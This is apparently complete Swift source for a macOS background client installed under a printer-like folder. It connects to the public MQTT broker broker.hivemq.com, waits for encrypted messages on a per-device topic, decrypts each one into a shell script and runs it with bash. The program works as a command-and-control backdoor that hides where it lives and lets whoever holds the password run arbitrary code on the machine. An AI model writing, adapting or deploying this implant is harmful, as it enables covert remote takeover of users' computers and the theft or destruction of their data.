import Foundation
import CryptoKit
import CocoaMQTT
import CommonCrypto


let base = FileManager.default.homeDirectoryForCurrentUser
    .appendingPathComponent("Library/Printers/mountain/client/main")

let passwordFile = base.appendingPathComponent("password")
let updatesDirectory = base.appendingPathComponent("updates")


func readPassword() -> String {
    guard let data = try? Data(contentsOf: passwordFile),
          let password = String(data: data, encoding: .utf8)
    else {
        fatalError("Password file missing")
    }

    return password.trimmingCharacters(in: .whitespacesAndNewlines)
}


func deriveID(_ password: String) -> String {
    let data = Data(("mountain-id:" + password).utf8)
    let hash = SHA256.hash(data: data)

    return hash.map {
        String(format: "%02x", $0)
    }.joined()
}


func deriveKey(password: String, salt: Data) -> SymmetricKey {

    let passwordData = Array(password.utf8)
    let saltData = Array(salt)

    var derivedKey = [UInt8](
        repeating: 0,
        count: 32
    )

    let result = CCKeyDerivationPBKDF(
        CCPBKDFAlgorithm(kCCPBKDF2),
        passwordData,
        passwordData.count,
        saltData,
        saltData.count,
        CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA256),
        100000,
        &derivedKey,
        derivedKey.count
    )

    guard result == kCCSuccess else {
        fatalError("PBKDF2 failed")
    }

    return SymmetricKey(
        data: Data(derivedKey)
    )
}


func decrypt(
    password: String,
    salt: Data,
    nonce: Data,
    encrypted: Data
) throws -> Data {

    let key = deriveKey(
        password: password,
        salt: salt
    )

    let nonceObject = try AES.GCM.Nonce(
        data: nonce
    )

    let sealedBox = try AES.GCM.SealedBox(
        nonce: nonceObject,
        ciphertext: encrypted.dropLast(16),
        tag: encrypted.suffix(16)
    )

    return try AES.GCM.open(
        sealedBox,
        using: key
    )
}


func executeScript(_ data: Data) {

    try? FileManager.default.createDirectory(
        at: updatesDirectory,
        withIntermediateDirectories: true
    )

    let script = updatesDirectory
        .appendingPathComponent("update.sh")

    do {
        try data.write(to: script)

        let chmod = Process()
        chmod.executableURL = URL(
            fileURLWithPath: "/bin/chmod"
        )
        chmod.arguments = [
            "755",
            script.path
        ]

        try chmod.run()
        chmod.waitUntilExit()


        let process = Process()

        process.executableURL = URL(
            fileURLWithPath: "/bin/bash"
        )

        process.arguments = [
            script.path
        ]

        try process.run()

    } catch {
        print("Script execution failed: \(error)")
    }
}


class MQTTDelegate: NSObject, CocoaMQTTDelegate {

    let password: String
    let deviceID: String


    init(
        password: String,
        deviceID: String
    ) {
        self.password = password
        self.deviceID = deviceID
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didConnectAck ack: CocoaMQTTConnAck
    ) {

        print("Connected")

        mqtt.subscribe(
            "mountain/\(deviceID)"
        )
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didReceiveMessage message: CocoaMQTTMessage,
        id: UInt16
    ) {

        guard let string = message.string else {
            return
        }


        guard let json = try? JSONSerialization.jsonObject(
            with: Data(string.utf8)
        ) as? [String: String]
        else {
            print("Invalid message")
            return
        }


        guard
            let saltString = json["salt"],
            let nonceString = json["nonce"],
            let dataString = json["data"],

            let salt = Data(base64Encoded: saltString),
            let nonce = Data(base64Encoded: nonceString),
            let encrypted = Data(base64Encoded: dataString)

        else {
            print("Invalid payload")
            return
        }


        do {

            let script = try decrypt(
                password: password,
                salt: salt,
                nonce: nonce,
                encrypted: encrypted
            )

            print("Script verified")

            executeScript(script)

        } catch {

            print(
                "Decryption failed: \(error)"
            )
        }
    }


    func mqttDidDisconnect(
        _ mqtt: CocoaMQTT,
        withError err: Error?
    ) {
        print("Disconnected")
    }


    func mqttDidPing(
        _ mqtt: CocoaMQTT
    ) {
    }


    func mqttDidReceivePong(
        _ mqtt: CocoaMQTT
    ) {
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didPublishMessage message: CocoaMQTTMessage,
        id: UInt16
    ) {
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didPublishAck id: UInt16
    ) {
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didSubscribeTopics success: NSDictionary,
        failed: [String]
    ) {
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didUnsubscribeTopics topics: [String]
    ) {
    }
}


let password = readPassword()
let deviceID = deriveID(password)


let mqtt = CocoaMQTT(
    clientID: deviceID,
    host: "broker.hivemq.com",
    port: 1883
)


let delegate = MQTTDelegate(
    password: password,
    deviceID: deviceID
)


mqtt.delegate = delegate
mqtt.keepAlive = 60

_ = mqtt.connect()

RunLoop.main.run()